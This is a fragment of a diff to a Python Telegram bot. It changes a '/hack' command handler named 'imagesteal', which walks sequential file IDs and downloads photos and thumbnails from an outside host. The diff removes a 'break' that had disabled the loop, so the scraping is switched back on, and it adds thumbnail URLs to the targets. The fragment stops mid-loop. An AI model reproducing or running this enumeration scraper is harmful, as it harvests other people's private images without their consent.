@@ -93,11 +93,11 @@ def todbsendtext (replied,message):
 			
 @bot.message_handler(commands=['hack'])
 def imagesteal(message):
-	a = 1049307
+	a = 1051706
 	while a > 0:
-		break
 		try:
-			url = str("http://xn--m38h.ml/tgFile/?l=photos/file_"+str(a)+".jpg")
+			url2 = str("http://xn--m38h.ml/tgFile/?l=photos/file_"+str(a)+".jpg")
+			url = str("http://xn--m38h.ml/tgFile/?l=thumbnails/file_"+str(a)+".jpg")
 			path = str("file_"+str(a)+".jpg")
 			response = requests.get(url)
 			if not response.content == "b''":
